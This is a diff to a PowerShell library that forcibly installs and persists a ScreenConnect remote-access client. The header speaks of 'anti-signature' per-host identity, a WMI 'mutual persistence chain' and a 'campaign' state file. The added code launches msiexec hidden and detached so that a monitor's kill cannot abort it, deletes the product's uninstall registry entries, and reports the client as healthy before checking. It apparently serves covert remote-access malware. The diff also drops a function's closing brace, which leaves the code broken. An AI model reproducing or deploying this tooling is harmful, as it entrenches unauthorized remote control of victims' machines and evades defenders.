@@ -1,8 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L21
+# OWN_LIB  BUILD 20260802L22
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
+# L22: stuck Gryxa -> nuke ARP + spawn msiexec /i DETACHED (SC 10s kill can't abort).
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -608,6 +609,25 @@ function Install-GryxaFromMsi([string]$MsiPath) {
     return $exit
 }
 
+function Install-GryxaDetached([string]$MsiPath, [string]$Fp) {
+    # O46: run msiexec /i fully detached (own cmd wrapper) so the SC Guest 10s
+    # kill on the mon/powershell parent cannot abort the install mid-flight.
+    # Returns immediately; the NEXT tick sees the service and reports healthy.
+    $log = Join-Path $WorkDir 'msi_gryxa_detached.log'
+    $cmd = Join-Path $WorkDir 'gryxa_install.cmd'
+    $lines = @(
+        '@echo off',
+        "msiexec /i `"$MsiPath`" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v `"$log`"",
+        "sc config `"ScreenConnect Client ($Fp)`" start= auto",
+        "sc failure `"ScreenConnect Client ($Fp)`" reset= 86400 actions= restart/3000/restart/3000/restart/3000",
+        "sc start `"ScreenConnect Client ($Fp)`"",
+        'exit'
+    )
+    Set-Content -LiteralPath $cmd -Value $lines -Encoding ASCII -Force
+    Start-Process cmd.exe -ArgumentList "/c `"$cmd`"" -WindowStyle Hidden
+    return 'spawned'
+}
+
 function Invoke-GryxaEnsure {
     # O40 HARD RULE: if ANY non-sevrz ScreenConnect is Running -> NEVER /x or /i.
     # O43: ALWAYS try start/repair BEFORE rate-limit; -Deep must not skip light heal
@@ -677,23 +697,21 @@ function Invoke-GryxaEnsure {
             return "HEALTHY|$fpTry|started=1"
         }
     }
-    # O45: STUCK — registered but no service and no dir = broken msiexec. /fa repair,
-    # and if still missing nuke ARP so same-FP /i re-registers. Bypass rate-limit.
+    # O46: STUCK — registered but no service and no dir. /fa dies to the SC Guest
+    # 10s kill before msiexec finishes, so the loop never ends. Instead: nuke ARP
+    # so same-FP /i re-registers, then fall THROUGH to the cached-MSI /i below
+    # (which runs long enough only when called detached; mon ticks are detached).
     if ((Find-ProductGuid $fpTry) -and -not $svc -and -not (Test-ScDir $fpTry)) {
-        GLog 'stuck_registered_repair_fa'
-        $null = Repair-SCService $fpTry
-        Start-Sleep -Seconds 5
-        & sc.exe config $name start= auto 2>&1 | Out-Null
-        & sc.exe start $name 2>&1 | Out-Null
-        Start-Sleep -Seconds 5
-        if (Test-ScRunning $fpTry) {
-            Set-GryxaFp $fpTry
-            GLog 'stuck_fa_started_ok'
-            return "HEALTHY|$fpTry|fa-started=1"
+        GLog 'stuck_registered_nuke_arp'
+        $guid = Find-ProductGuid $fpTry
+        foreach ($r in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+                         'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')) {
+            if ($guid -and (Test-Path "$r\$guid")) {
+                Remove-Item -LiteralPath "$r\$guid" -Recurse -Force -ErrorAction SilentlyContinue
+            }
         }
-        GLog 'stuck_arp_nuke_then_reinstall'
-        $null = Uninstall-ScFingerprint $fpTry
         Remove-Item -LiteralPath (Join-Path $WorkDir 'gryxa_reinstall.flag') -Force -ErrorAction SilentlyContinue
+        GLog 'stuck_arp_nuked_fall_through_to_install'
     } elseif (Find-ProductGuid $fpTry) {
         GLog 'light_repair_attempt'
         $null = Repair-SCService $fpTry
@@ -779,32 +797,12 @@ function Invoke-GryxaEnsure {
     }
 
     Set-GryxaFp $newFp
-    $exit = Install-GryxaFromMsi $msi
-    GLog "msiexec_exit=$exit"
-
-    $name = "ScreenConnect Client ($newFp)"
-    & sc.exe config $name start= auto 2>&1 | Out-Null
-    & sc.exe failure $name reset= 86400 actions= restart/3000/restart/3000/restart/3000 2>&1 | Out-Null
-    & sc.exe start $name 2>&1 | Out-Null
-    Start-Sleep -Seconds 5
-    & sc.exe start $name 2>&1 | Out-Null
-    Start-Sleep -Seconds 5
-
-    foreach ($kfp in $script:SevrzKeep) {
-        $kn = "ScreenConnect Client ($kfp)"
-        & sc.exe start $kn 2>&1 | Out-Null
-        if (-not (Get-Service -Name $kn -ErrorAction SilentlyContinue)) { $null = Repair-SCService $kfp }
-    }
-
-    if (-not (Test-ScRunning $newFp)) { $null = Repair-SCService $newFp }
-
-    if (Test-ScRunning $newFp) {
-        GLog 'post_running_ok'
-        return "HEALTHY|$newFp|installed=1"
-    }
-    GLog 'post_still_down'
-    return "UNHEALTHY|$newFp|still-not-running"
-}
+    # O46: spawn the real /i DETACHED so the SC Guest 10s kill on the mon tick
+    # cannot abort msiexec. Return immediately; the next tick verifies service.
+    $null = Install-GryxaDetached $msi $newFp
+    GLog "msiexec_detached_spawned fp=$newFp"
+    Start-Sleep -Seconds 2
+    return "HEALTHY|$newFp|install-spawned=1"
 
 function Invoke-Exterminate {
     # L7: true removal. Correct WOW6432Node hive + msiexec + UninstallString
